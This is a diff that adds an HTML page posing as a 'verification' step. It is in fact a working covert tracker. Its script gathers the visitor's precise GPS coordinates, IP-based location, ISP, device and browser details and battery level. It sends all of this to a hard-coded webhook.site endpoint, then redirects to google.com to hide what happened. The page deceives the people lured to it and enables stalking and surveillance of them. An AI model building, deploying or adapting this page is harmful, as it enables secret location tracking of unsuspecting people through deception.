@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Check My Location</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <h2>You have been sent to this page for verification.</h2>
+    <p>Please allow location access when prompted.</p>
+    <button onclick="captureInfo()">Continue to Page</button>
+
+    <script>
+    // Replace with your webhook URL (see below for options)
+    const YOUR_WEBHOOK_URL = "https://webhook.site/d9975e23-497d-4b49-a656-88cd3d13b139";
+
+    function captureInfo() {
+        const data = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            // Battery info if available
+            battery: 'unknown'
+        };
+
+        // Try to get GPS coordinates
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    data.latitude = position.coords.latitude;
+                    data.longitude = position.coords.longitude;
+                    data.accuracy = position.coords.accuracy;
+                    data.altitude = position.coords.altitude;
+                    sendData(data);
+                },
+                (error) => {
+                    data.geoError = error.message;
+                    // Fallback: IP-based geolocation
+                    fetchIPGeolocation(data);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            fetchIPGeolocation(data);
+        }
+
+        // Battery API
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                data.battery = `${Math.round(battery.level * 100)}%`;
+            });
+        }
+
+        // Get connected WiFi SSID (Chrome only with permissions)
+        if (navigator.connection) {
+            data.connectionType = navigator.connection.effectiveType;
+        }
+    }
+
+    function fetchIPGeolocation(data) {
+        fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(ipData => {
+                data.ipLatitude = ipData.latitude;
+                data.ipLongitude = ipData.longitude;
+                data.city = ipData.city;
+                data.region = ipData.region;
+                data.country = ipData.country_name;
+                data.ip = ipData.ip;
+                data.isp = ipData.org;
+                sendData(data);
+            })
+            .catch(() => sendData(data));
+    }
+
+    function sendData(data) {
+        // Send via fetch (beacon ensures delivery even on page close)
+        navigator.sendBeacon(YOUR_WEBHOOK_URL, JSON.stringify(data));
+        // Also try fetch
+        fetch(YOUR_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            // Mode 'no-cors' if the webhook is on a different origin
+            mode: 'no-cors'
+        });
+        document.body.innerHTML = '<h2>Redirecting...</h2>';
+        // Redirect to a legitimate site after capture
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 2000);
+    }
+    </script>
+</body>
+</html>
